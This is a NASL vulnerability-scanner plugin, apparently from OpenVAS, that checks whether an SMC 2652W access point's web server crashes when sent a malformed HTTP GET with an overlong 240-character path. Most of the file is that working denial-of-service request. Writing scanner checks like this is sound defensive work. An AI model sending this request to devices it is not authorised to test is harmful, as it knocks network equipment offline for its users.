if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11141" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_name( "Crash SMC AP" );
	script_category( ACT_DENIAL );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2002 John Lampe...j_lampe@bellsouth.net" );
	script_family( "Denial of Service" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Contact vendor for a fix." );
	script_tag( name: "summary", value: "The remote SMC 2652W Access point web server crashes when sent a
  specially formatted HTTP request." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(http_is_dead( port: port )){
	exit( 0 );
}
req = NASLString( "GET /", crap( 240 ), ".html?OpenElement&FieldElemFormat=gif HTTP/1.1\\r\\n" );
req = NASLString( req, "Referer: http://localhost/bob\\r\\n" );
req = NASLString( req, "Content-Type: application/x-www-form-urlencoded\\r\\n" );
req = NASLString( req, "Connection: Keep-Alive\\r\\n" );
req = NASLString( req, "Cookie: VARIABLE=FOOBAR; path=/\\r\\n" );
req = NASLString( req, "User-Agent: ", http_get_user_agent(), "\\r\\n" );
req = NASLString( req, "Variable: result\\r\\n" );
req = NASLString( req, "Host: ", get_host_name(), "\\r\\nContent-length: 13\\r\\n" );
req = NASLString( req, "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png\\r\\n" );
req = NASLString( req, "Accept-Encoding: gzip\\r\\nAccept-Language:en\\r\\nAccept-Charset: iso-8859-1,*,utf-8\\r\\n\\r\\n" );
http_send_recv( port: port, data: req );
if(http_is_dead( port: port )){
	security_message( port );
}

